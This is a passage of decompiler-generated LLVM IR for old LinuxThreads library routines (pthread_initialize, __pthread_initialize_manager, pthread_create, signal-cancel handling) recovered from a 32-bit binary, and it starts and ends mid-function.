  %v4_804da0f = call i32 @__libc_sigaction(i32 %v0_804da09, i32* nonnull %stack_var_-144, i32 0)
  %v0_804da14 = load i32, i32* @global_var_8062a90.145, align 16
  %tmp12 = icmp slt i32 %v0_804da14, 1
  br i1 %tmp12, label %dec_label_pc_804da2d, label %dec_label_pc_804da20

dec_label_pc_804da20:                             ; preds = %entry
  %v4_804da25 = call i32 @__libc_sigaction(i32 %v0_804da14, i32* nonnull %stack_var_-144, i32 0)
  br label %dec_label_pc_804da2d

dec_label_pc_804da2d:                             ; preds = %entry, %dec_label_pc_804da20
  %v0_804da34 = phi i32 [ %v0_804da14, %entry ], [ %v4_804da25, %dec_label_pc_804da20 ]
  ret i32 %v0_804da34

; uselistorder directives
  uselistorder i32 %v0_804da14, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_804da2d, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-6291456 = alloca i32, align 4
  %v0_804da35 = load i32, i32* @esi, align 4
  %v0_804da36 = load i32, i32* @ebx, align 4
  %v0_804da3d = load i32, i32* @global_var_806338c.133, align 4
  %v1_804da3d = icmp eq i32 %v0_804da3d, 0
  %v1_804da44 = icmp eq i1 %v1_804da3d, false
  br i1 %v1_804da44, label %dec_label_pc_804dbcf, label %dec_label_pc_804da4a

dec_label_pc_804da4a:                             ; preds = %entry
  %v4_804da51 = ptrtoint i32* %stack_var_-6291456 to i32
  store i32 %v4_804da51, i32* %eax.global-to-local, align 4
  store i32 %v4_804da51, i32* @global_var_806338c.133, align 4
  %v1_804da5b = call i32 @__libc_getpid(i32 %v0_804da36)
  store i32 ptrtoint (i32* @global_var_80653f8.178 to i32), i32* bitcast (i32** @global_var_8062704.180 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_80653fc.179 to i32), i32* bitcast (i32** @global_var_806270c.181 to i32*), align 4
  store i32 0, i32* @global_var_8062bb0.182, align 16
  store i32 %v1_804da5b, i32* @global_var_80626d4.183, align 4
  %storemerge3 = load i32, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  store i32 %storemerge3, i32* %eax.global-to-local, align 4
  %v1_804da9a4 = icmp eq i32 %storemerge3, 0
  %v1_804da9c11 = icmp eq i1 %v1_804da9a4, false
  br i1 %v1_804da9c11, label %dec_label_pc_804da8a, label %dec_label_pc_804da9e

dec_label_pc_804da8a:                             ; preds = %dec_label_pc_804da4a, %dec_label_pc_804da97
  %v0_804da90 = phi i32 [ %storemerge, %dec_label_pc_804da97 ], [ %storemerge3, %dec_label_pc_804da4a ]
  %v1_804da8a = add i32 %v0_804da90, 52
  %v2_804da8a = inttoptr i32 %v1_804da8a to i32*
  %v3_804da8a = load i32, i32* %v2_804da8a, align 4
  %v12_804da8a = icmp eq i32 %v3_804da8a, 1
  br i1 %v12_804da8a, label %dec_label_pc_804da97, label %dec_label_pc_804da90

dec_label_pc_804da90:                             ; preds = %dec_label_pc_804da8a
  store i32 0, i32* %v2_804da8a, align 4
  %v0_804da97.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da97

dec_label_pc_804da97:                             ; preds = %dec_label_pc_804da8a, %dec_label_pc_804da90
  %v0_804da97 = phi i32 [ %v0_804da90, %dec_label_pc_804da8a ], [ %v0_804da97.pre, %dec_label_pc_804da90 ]
  %v1_804da97 = add i32 %v0_804da97, 32
  %v2_804da97 = inttoptr i32 %v1_804da97 to i32*
  %storemerge = load i32, i32* %v2_804da97, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804da9a = icmp eq i32 %storemerge, 0
  %v1_804da9c = icmp eq i1 %v1_804da9a, false
  br i1 %v1_804da9c, label %dec_label_pc_804da8a, label %dec_label_pc_804da9a.dec_label_pc_804da9e_crit_edge

dec_label_pc_804da9a.dec_label_pc_804da9e_crit_edge: ; preds = %dec_label_pc_804da97
  br label %dec_label_pc_804da9e

dec_label_pc_804da9e:                             ; preds = %dec_label_pc_804da9a.dec_label_pc_804da9e_crit_edge, %dec_label_pc_804da4a
  %v2_804daa0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_804daa0, i32* @ebx, align 4
  %v2_804daaa = call i32 @getrlimit(i32 3, i32 %v2_804daa0)
  store i32 %v2_804daaa, i32* %eax.global-to-local, align 4
  %v1_804daaf = call i32 @__GI_getpagesize(i32 3)
  %v2_804dabc = mul i32 %v1_804daaf, 2
  store i32 %v2_804dabc, i32* %eax.global-to-local, align 4
  %v2_804dabe = sub i32 2097152, %v2_804dabc
  %v3_804dac0 = load i32, i32* %stack_var_-16, align 4
  %tmp = icmp ugt i32 %v3_804dac0, %v2_804dabe
  br i1 %tmp, label %dec_label_pc_804dac9, label %dec_label_pc_804dadd

dec_label_pc_804dac9:                             ; preds = %dec_label_pc_804da9e
  store i32 %v2_804dabe, i32* %stack_var_-16, align 4
  %v6_804dad5 = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_804dad5 = call i32 @__GI_setrlimit(i32 3, %rlimit* %v6_804dad5, i32 %v2_804dabc, i32 %v2_804dabc)
  store i32 %v7_804dad5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dadd

dec_label_pc_804dadd:                             ; preds = %dec_label_pc_804da9e, %dec_label_pc_804dac9
  store i32 134536999, i32* %stack_var_-284, align 4
  %v2_804dae8 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804dae8, i32* @ebx, align 4
  %v2_804daec = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_804daec, i32* @esi, align 4
  %v1_804daf1 = call i32 @sigemptyset(i32 %v2_804dae8)
  store i32 %v1_804daf1, i32* %eax.global-to-local, align 4
  %v0_804db07 = load i32, i32* @global_var_8062a88.170, align 8
  %v5_804db0d = call i32 @__libc_sigaction(i32 %v0_804db07, i32* nonnull %stack_var_-284, i32 0)
  store i32 134536854, i32* %stack_var_-284, align 4
  store i32 %v2_804daec, i32* %eax.global-to-local, align 4
  %v0_804db1c = load i32, i32* @global_var_8062a88.170, align 8
  %v2_804db23 = call i32 @__GI_sigaddset(i32 %v2_804dae8, i32 %v0_804db1c)
  store i32 %v2_804db23, i32* %eax.global-to-local, align 4
  %v0_804db2e = load i32, i32* @global_var_8062a8c.154, align 4
  %v5_804db34 = call i32 @__libc_sigaction(i32 %v0_804db2e, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_804db34, i32* %eax.global-to-local, align 4
  %v0_804db3c = load i32, i32* @global_var_8062a90.145, align 16
  %tmp34 = icmp slt i32 %v0_804db3c, 1
  br i1 %tmp34, label %dec_label_pc_804db6a, label %dec_label_pc_804db45

dec_label_pc_804db45:                             ; preds = %dec_label_pc_804dadd
  store i32 134534799, i32* %stack_var_-284, align 4
  %v1_804db51 = call i32 @sigemptyset(i32 %v2_804dae8)
  store i32 %v1_804db51, i32* %eax.global-to-local, align 4
  %v0_804db5c = load i32, i32* @global_var_8062a90.145, align 16
  %v5_804db62 = call i32 @__libc_sigaction(i32 %v0_804db5c, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_804db62, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804db6a

dec_label_pc_804db6a:                             ; preds = %dec_label_pc_804dadd, %dec_label_pc_804db45
  %v2_804db6d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804db6d, i32* @ebx, align 4
  %v1_804db75 = call i32 @sigemptyset(i32 %v2_804db6d)
  store i32 %v2_804db6d, i32* %eax.global-to-local, align 4
  %v0_804db7c = load i32, i32* @global_var_8062a88.170, align 8
  %v2_804db83 = call i32 @__GI_sigaddset(i32 %v2_804db6d, i32 %v0_804db7c)
  store i32 %v2_804db83, i32* %eax.global-to-local, align 4
  %v4_804db90 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v5_804db90 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v4_804db90, i32 0)
  store i32 %v5_804db90, i32* %eax.global-to-local, align 4
  store i32 %v2_804db6d, i32* @esi, align 4
  %v1_804db9e = call i32 @__GI_sigdelset(i32 %v2_804db6d)
  store i32 %v2_804db6d, i32* %eax.global-to-local, align 4
  %v0_804dba5 = load i32, i32* @global_var_8062a8c.154, align 4
  %v2_804dbac = call i32 @__GI_sigaddset(i32 %v2_804db6d, i32 %v0_804dba5)
  store i32 %v2_804dbac, i32* %eax.global-to-local, align 4
  %v5_804dbb9 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_804db90, i32 0)
  store i32 %v5_804dbb9, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ebx, align 4
  store i32 %v2_804db6d, i32* @esi, align 4
  %v2_804dbc7 = call i32 @on_exit(i32 134535315, i32 0)
  store i32 %v2_804dbc7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbcf

dec_label_pc_804dbcf:                             ; preds = %entry, %dec_label_pc_804db6a
  %.0 = phi i32 [ undef, %entry ], [ %v2_804dbc7, %dec_label_pc_804db6a ]
  store i32 %v0_804da36, i32* @ebx, align 4
  store i32 %v0_804da35, i32* @esi, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_804db6d, { 2, 4, 1, 5, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_804dabe, { 1, 0 }
  uselistorder i32 %v2_804dabc, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %stack_var_-284, { 0, 3, 1, 4, 2, 6, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 18, 0, 17 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 4, 0, 8, 7, 6, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 (i32)* @sigemptyset, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* @global_var_80653f8.178, { 1, 0 }
  uselistorder label %dec_label_pc_804dbcf, { 1, 0 }
  uselistorder label %dec_label_pc_804db6a, { 1, 0 }
  uselistorder label %dec_label_pc_804dadd, { 1, 0 }
  uselistorder label %dec_label_pc_804da97, { 1, 0 }
  uselistorder label %dec_label_pc_804da8a, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804dbd8 = load i32, i32* @ebx, align 4
  %v0_804dbdf = load i32, i32* @global_var_80633a0.186, align 32
  %v1_804dbe4 = inttoptr i32 %v0_804dbdf to i32*
  store i32 1, i32* %v1_804dbe4, align 4
  %v0_804dbea = load i32, i32* @global_var_806338c.133, align 4
  %v1_804dbea = icmp eq i32 %v0_804dbea, 0
  %v1_804dbf1 = icmp eq i1 %v1_804dbea, false
  br i1 %v1_804dbf1, label %dec_label_pc_804dbf8, label %dec_label_pc_804dbf3

dec_label_pc_804dbf3:                             ; preds = %entry
  %v1_804dbf3 = call i32 @pthread_initialize(i32 %v0_804dbd8)
  br label %dec_label_pc_804dbf8

dec_label_pc_804dbf8:                             ; preds = %entry, %dec_label_pc_804dbf3
  %v0_804dbf8 = load i32, i32* @global_var_8067654.156, align 4
  %factor = mul i32 %v0_804dbf8, 2
  %v3_804dc00 = add i32 %factor, -32
  store i32 %v3_804dc00, i32* %stack_var_-188, align 4
  %v1_804dc05 = call i32 @malloc(i32 %v3_804dc00)
  store i32 %v1_804dc05, i32* @global_var_8063390.134, align 16
  %v1_804dc17 = icmp eq i32 %v1_804dc05, 0
  br i1 %v1_804dc17, label %dec_label_pc_804ddd5, label %dec_label_pc_804dc1f

dec_label_pc_804dc1f:                             ; preds = %dec_label_pc_804dbf8
  %v0_804dc1f = load i32, i32* @global_var_8067654.156, align 4
  %v2_804dc27 = mul i32 %v0_804dc1f, 2
  %v3_804dc27 = add i32 %v1_804dc05, -32
  %v4_804dc27 = add i32 %v3_804dc27, %v2_804dc27
  store i32 %v4_804dc27, i32* @global_var_8063394.135, align 4
  %v2_804dc30 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_804dc30, i32* %stack_var_-188, align 4
  %v1_804dc38 = call i32 @__GI_pipe(i32 %v2_804dc30)
  %v8_804dc40 = icmp eq i32 %v1_804dc38, -1
  %v1_804dc41 = icmp eq i1 %v8_804dc40, false
  br i1 %v1_804dc41, label %dec_label_pc_804dc56, label %dec_label_pc_804dc43

dec_label_pc_804dc43:                             ; preds = %dec_label_pc_804dc1f
  %v0_804dc46 = load i32, i32* @global_var_8063390.134, align 16
  store i32 %v0_804dc46, i32* %stack_var_-188, align 4
  %v1_804dc4c = call i32 @free(i32 %v0_804dc46)
  br label %dec_label_pc_804dd47

dec_label_pc_804dc56:                             ; preds = %dec_label_pc_804dc1f
  %v0_804dc56 = load i32, i32* @global_var_8067a04.187, align 4
  %v1_804dc5b = icmp eq i32 %v0_804dc56, 0
  %v2_804dc5d = load i32, i32* @global_var_806285c.188, align 4
  %v3_804dc5d = select i1 %v1_804dc5b, i32 %v2_804dc5d, i32 %v0_804dc56
  %v1_804dc64 = icmp eq i32 %v3_804dc5d, 0
  store i32 %v3_804dc5d, i32* @global_var_806285c.188, align 4
  br i1 %v1_804dc64, label %dec_label_pc_804dcf9, label %dec_label_pc_804dc71

dec_label_pc_804dc71:                             ; preds = %dec_label_pc_804dc56
  %v0_804dc71 = load i32, i32* @global_var_80679f4.148, align 4
  %v0_804dc76 = load i8, i8* @global_var_8062860.189, align 32
  %v1_804dc76 = zext i8 %v0_804dc76 to i32
  %v4_804dc76 = or i32 %v1_804dc76, %v0_804dc71
  %v3_804dc7c = trunc i32 %v4_804dc76 to i8
  %v5_804dc7c = icmp slt i8 %v3_804dc7c, 0
  %v1_804dc7e = icmp eq i1 %v5_804dc7c, false
  br i1 %v1_804dc7e, label %dec_label_pc_804dcf9, label %dec_label_pc_804dc80

dec_label_pc_804dc80:                             ; preds = %dec_label_pc_804dc71
  %v0_804dc80 = load i32, i32* bitcast (i32** @global_var_80628bc.161 to i32*), align 4
  store i32 %v0_804dc80, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804dc87 = load i32, i32* %stack_var_-188, align 4
  %v1_804dc87 = call i32 @__pthread_lock(i32 %v0_804dc87)
  %v3_804dc8c = load i32, i32* %stack_var_-12, align 4
  %v0_804dc98 = load i32, i32* @global_var_8063394.135, align 4
  store i32 134529126, i32* %stack_var_-188, align 4
  %v4_804dca3 = call i32 @clone(i32 134529126, i32 %v0_804dc98, i32 3840, i32 %v3_804dc8c)
  store i32 %v4_804dca3, i32* @eax, align 4
  %v10_804dcab = icmp eq i32 %v4_804dca3, -1
  store i32 %v4_804dca3, i32* @ebx, align 4
  br i1 %v10_804dcab, label %dec_label_pc_804dce4, label %dec_label_pc_804dcb2

dec_label_pc_804dcb2:                             ; preds = %dec_label_pc_804dc80
  store i32 ptrtoint (i32* @global_var_80628a0.136 to i32), i32* @global_var_8062a4c.190, align 4
  store i32 8, i32* @global_var_8062a48.191, align 8
  store i32 ptrtoint (i32* @global_var_80628a0.136 to i32), i32* @global_var_80679fc.149, align 4
  store i32 2049, i32* @global_var_80628b0.192, align 16
  store i32 %v4_804dca3, i32* @global_var_80628b4.139, align 4
  %v0_804dcdf = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_804dce4

dec_label_pc_804dce4:                             ; preds = %dec_label_pc_804dc80, %dec_label_pc_804dcb2
  %v0_804dce7 = load i32, i32* bitcast (i32** @global_var_80628bc.161 to i32*), align 4
  store i32 %v0_804dce7, i32* %stack_var_-188, align 4
  %v1_804dced = inttoptr i32 %v0_804dce7 to i32*
  %v2_804dced = call i32 @__pthread_unlock(i32* %v1_804dced)
  %v0_804dcf5 = load i32, i32* @ebx, align 4
  %v1_804dcf5 = icmp eq i32 %v0_804dcf5, 0
  %v1_804dcf7 = icmp eq i1 %v1_804dcf5, false
  br i1 %v1_804dcf7, label %dec_label_pc_804dd1a, label %dec_label_pc_804dcf9

dec_label_pc_804dcf9:                             ; preds = %dec_label_pc_804dce4, %dec_label_pc_804dc71, %dec_label_pc_804dc56
  %v3_804dcf9 = load i32, i32* %stack_var_-12, align 4
  %v0_804dd05 = load i32, i32* @global_var_8063394.135, align 4
  store i32 134527493, i32* %stack_var_-188, align 4
  %v4_804dd10 = call i32 @clone(i32 134527493, i32 %v0_804dd05, i32 3840, i32 %v3_804dcf9)
  store i32 %v4_804dd10, i32* @ebx, align 4
  br label %dec_label_pc_804dd1a

dec_label_pc_804dd1a:                             ; preds = %dec_label_pc_804dce4, %dec_label_pc_804dcf9
  %v0_804dd63 = phi i32 [ %v0_804dcf5, %dec_label_pc_804dce4 ], [ %v4_804dd10, %dec_label_pc_804dcf9 ]
  %v10_804dd1a = icmp eq i32 %v0_804dd63, -1
  %v1_804dd1d = icmp eq i1 %v10_804dd1a, false
  br i1 %v1_804dd1d, label %dec_label_pc_804dd52, label %dec_label_pc_804dd1f

dec_label_pc_804dd1f:                             ; preds = %dec_label_pc_804dd1a
  %v0_804dd22 = load i32, i32* @global_var_8063390.134, align 16
  store i32 %v0_804dd22, i32* %stack_var_-188, align 4
  %v1_804dd28 = call i32 @free(i32 %v0_804dd22)
  store i32 %v0_804dd22, i32* @ebx, align 4
  %v3_804dd2e = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_804dd2e, i32* %stack_var_-188, align 4
  %v1_804dd35 = call i32 @__libc_close(i32 %v3_804dd2e)
  store i32 %v3_804dd2e, i32* @ecx, align 4
  store i32 %tmp7, i32* %stack_var_-188, align 4
  %v1_804dd42 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_804dd47

dec_label_pc_804dd47:                             ; preds = %dec_label_pc_804dc43, %dec_label_pc_804dd1f
  br label %dec_label_pc_804ddd5

dec_label_pc_804dd52:                             ; preds = %dec_label_pc_804dd1a
  store i32 2049, i32* @global_var_80628b0.192, align 16
  store i32 %v0_804dd63, i32* @global_var_80628b4.139, align 4
  store i32 %tmp7, i32* @global_var_8062a84.142, align 4
  %v3_804dd6e = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_804dd6e, i32* @global_var_8067a08.177, align 8
  %v0_804dd7a = load i32, i32* @global_var_8067a00.144, align 512
  %v1_804dd7f = icmp eq i32 %v0_804dd7a, 0
  br i1 %v1_804dd7f, label %dec_label_pc_804ddad.preheader, label %dec_label_pc_804dd83

dec_label_pc_804dd83:                             ; preds = %dec_label_pc_804dd52
  %v0_804dd83 = load i32, i32* @global_var_8062a90.145, align 16
  %tmp17 = icmp slt i32 %v0_804dd83, 1
  br i1 %tmp17, label %dec_label_pc_804ddad.preheader, label %dec_label_pc_804dd8c

dec_label_pc_804dd8c:                             ; preds = %dec_label_pc_804dd83
  store i32 %v0_804dd83, i32* %stack_var_-188, align 4
  %v1_804dd90 = call i32 @__GI_raise(i32 %v0_804dd83)
  %v1_804dd95 = call i32 @thread_self.7(i32 %v0_804dd83)
  store i32 %v1_804dd95, i32* %stack_var_-188, align 4
  %v1_804dd9d = call i32 @__pthread_wait_for_restart_signal(i32 %v1_804dd95)
  br label %dec_label_pc_804ddad.preheader

dec_label_pc_804ddad.preheader:                   ; preds = %dec_label_pc_804dd83, %dec_label_pc_804dd52, %dec_label_pc_804dd8c
  %v2_804ddad = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_804ddad

dec_label_pc_804ddad:                             ; preds = %dec_label_pc_804ddad.preheader, %dec_label_pc_804ddc9
  %v0_804ddb8 = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804ddb8, i32* %stack_var_-188, align 4
  %v3_804ddbe = call i32 @__libc_write(i32 %v0_804ddb8, i32 %v2_804ddad, i32 148)
  %v8_804ddc6 = icmp eq i32 %v3_804ddbe, -1
  %v1_804ddc7 = icmp eq i1 %v8_804ddc6, false
  br i1 %v1_804ddc7, label %dec_label_pc_804ddd3, label %dec_label_pc_804ddc9

dec_label_pc_804ddc9:                             ; preds = %dec_label_pc_804ddad
  %v0_804ddc9 = load i32, i32* %stack_var_-188, align 4
  %v1_804ddc9 = call i32 @__errno_location(i32 %v0_804ddc9)
  %v1_804ddce = inttoptr i32 %v1_804ddc9 to i32*
  %v2_804ddce = load i32, i32* %v1_804ddce, align 4
  %v11_804ddce = icmp eq i32 %v2_804ddce, 4
  br i1 %v11_804ddce, label %dec_label_pc_804ddad, label %dec_label_pc_804ddc9.dec_label_pc_804ddd3_crit_edge

dec_label_pc_804ddc9.dec_label_pc_804ddd3_crit_edge: ; preds = %dec_label_pc_804ddc9
  br label %dec_label_pc_804ddd3

dec_label_pc_804ddd3:                             ; preds = %dec_label_pc_804ddad, %dec_label_pc_804ddc9.dec_label_pc_804ddd3_crit_edge
  br label %dec_label_pc_804ddd5

dec_label_pc_804ddd5:                             ; preds = %dec_label_pc_804dbf8, %dec_label_pc_804dd47, %dec_label_pc_804ddd3
  %v0_804dddc = phi i32 [ -1, %dec_label_pc_804dbf8 ], [ -1, %dec_label_pc_804dd47 ], [ 0, %dec_label_pc_804ddd3 ]
  store i32 %v0_804dbd8, i32* @ebx, align 4
  ret i32 %v0_804dddc

; uselistorder directives
  uselistorder i32 %v0_804dd83, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804dd63, { 1, 0 }
  uselistorder i32 %v4_804dca3, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804dc30, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ddd5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ddd3, { 1, 0 }
  uselistorder label %dec_label_pc_804ddad, { 1, 0 }
  uselistorder label %dec_label_pc_804ddad.preheader, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dd47, { 1, 0 }
  uselistorder label %dec_label_pc_804dd1a, { 1, 0 }
  uselistorder label %dec_label_pc_804dce4, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf8, { 1, 0 }
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_804dddd = load i32, i32* @ebx, align 4
  %v0_804dde4 = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804dde4 = icmp slt i32 %v0_804dde4, 0
  %v1_804ddeb = icmp eq i1 %v2_804dde4, false
  br i1 %v1_804ddeb, label %dec_label_pc_804ddff, label %dec_label_pc_804dded

dec_label_pc_804dded:                             ; preds = %entry
  %v1_804dded = call i32 @__pthread_initialize_manager(i32 %v0_804dddd)
  %v2_804ddf7 = icmp slt i32 %v1_804dded, 0
  br i1 %v2_804ddf7, label %dec_label_pc_804de87, label %dec_label_pc_804ddff

dec_label_pc_804ddff:                             ; preds = %dec_label_pc_804dded, %entry
  %v1_804ddff = call i32 @thread_self.7(i32 %v0_804dddd)
  store i32 %v1_804ddff, i32* %stack_var_-152, align 4
  store i32 %v1_804ddff, i32* @ebx, align 4
  %v2_804de34 = ptrtoint i32* %stack_var_-132 to i32
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804de3d = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_804de34)
  %v2_804de45 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_804de45

dec_label_pc_804de45:                             ; preds = %dec_label_pc_804de61, %dec_label_pc_804ddff
  %v0_804de50 = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804de50, i32* %stack_var_-188, align 4
  %v3_804de56 = call i32 @__libc_write(i32 %v0_804de50, i32 %v2_804de45, i32 148)
  %v8_804de5e = icmp eq i32 %v3_804de56, -1
  %v1_804de5f = icmp eq i1 %v8_804de5e, false
  br i1 %v1_804de5f, label %dec_label_pc_804de6b, label %dec_label_pc_804de61

dec_label_pc_804de61:                             ; preds = %dec_label_pc_804de45
  %v0_804de61 = load i32, i32* %stack_var_-188, align 4
  %v1_804de61 = call i32 @__errno_location(i32 %v0_804de61)
  %v1_804de66 = inttoptr i32 %v1_804de61 to i32*
  %v2_804de66 = load i32, i32* %v1_804de66, align 4
  %v11_804de66 = icmp eq i32 %v2_804de66, 4
  br i1 %v11_804de66, label %dec_label_pc_804de45, label %dec_label_pc_804de6b

dec_label_pc_804de6b:                             ; preds = %dec_label_pc_804de61, %dec_label_pc_804de45
  %v0_804de6b = load i32, i32* @ebx, align 4
  store i32 %v0_804de6b, i32* @eax, align 4
  %v0_804de6d = call i32 @suspend.6()
  %v0_804de72 = load i32, i32* @ebx, align 4
  %v1_804de72 = add i32 %v0_804de72, 52
  %v2_804de72 = inttoptr i32 %v1_804de72 to i32*
  %v3_804de72 = load i32, i32* %v2_804de72, align 4
  %v4_804de72 = icmp eq i32 %v3_804de72, 0
  %v1_804de76 = icmp eq i1 %v4_804de72, false
  br i1 %v1_804de76, label %dec_label_pc_804de84, label %dec_label_pc_804de78

dec_label_pc_804de78:                             ; preds = %dec_label_pc_804de6b
  %v1_804de78 = add i32 %v0_804de72, 48
  %v2_804de78 = inttoptr i32 %v1_804de78 to i32*
  %v3_804de78 = load i32, i32* %v2_804de78, align 4
  store i32 %v3_804de78, i32* %arg1, align 4
  %v0_804de84.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804de84

dec_label_pc_804de84:                             ; preds = %dec_label_pc_804de6b, %dec_label_pc_804de78
  %v0_804de84 = phi i32 [ %v0_804de72, %dec_label_pc_804de6b ], [ %v0_804de84.pre, %dec_label_pc_804de78 ]
  %v1_804de84 = add i32 %v0_804de84, 52
  %v2_804de84 = inttoptr i32 %v1_804de84 to i32*
  %v3_804de84 = load i32, i32* %v2_804de84, align 4
  br label %dec_label_pc_804de87

dec_label_pc_804de87:                             ; preds = %dec_label_pc_804dded, %dec_label_pc_804de84
  %v0_804de8d = phi i32 [ 11, %dec_label_pc_804dded ], [ %v3_804de84, %dec_label_pc_804de84 ]
  ret i32 %v0_804de8d

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 ()* @suspend.6, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %dec_label_pc_804de87, { 1, 0 }
  uselistorder label %dec_label_pc_804de84, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v1_804de91 = call i32 @pthread_initialize(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804de91

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de96 = load i32, i32* @ebx, align 4
  store i32 %v0_804de96, i32* %stack_var_-4, align 4
  %v1_804de9a = call i32 @thread_self.7(i32 %v0_804de96)
  store i32 %v1_804de9a, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804dea3 = icmp eq i32 %v1_804de9a, 134621344
  %v1_804dea8 = icmp eq i1 %v6_804dea3, false
  br i1 %v1_804dea8, label %dec_label_pc_804deb6, label %dec_label_pc_804deaa

dec_label_pc_804deaa:                             ; preds = %entry
  %v2_804deae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804deae, i32* %eax.global-to-local, align 4
  %v2_804deb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804deb0, i32* @ebx, align 4
  %v1_804deb1 = call i32 @__pthread_manager_sighandler(i32 %arg1)
  store i32 %v1_804deb1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804deb6

dec_label_pc_804deb6:                             ; preds = %entry, %dec_label_pc_804deaa
  %v0_804defd = phi i32 [ %v1_804de9a, %entry ], [ %v1_804deb1, %dec_label_pc_804deaa ]
  %v0_804deb6 = load i32, i32* @global_var_8063398.158, align 8
  %v1_804deb6 = icmp eq i32 %v0_804deb6, 0
  br i1 %v1_804deb6, label %dec_label_pc_804deeb, label %dec_label_pc_804debf

dec_label_pc_804debf:                             ; preds = %dec_label_pc_804deb6
  %v1_804debf = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v12_804debf = icmp eq i32 %v0_804defd, %v1_804debf
  %v1_804dec5 = icmp eq i1 %v12_804debf, false
  br i1 %v1_804dec5, label %dec_label_pc_804debf.dec_label_pc_804dedd_crit_edge, label %dec_label_pc_804dec7

dec_label_pc_804debf.dec_label_pc_804dedd_crit_edge: ; preds = %dec_label_pc_804debf
  br label %dec_label_pc_804dedd

dec_label_pc_804dec7:                             ; preds = %dec_label_pc_804debf
  store i32 -2147483648, i32* %stack_var_-20, align 4
  %v0_804decf = load i32, i32* @global_var_80628b4.139, align 4
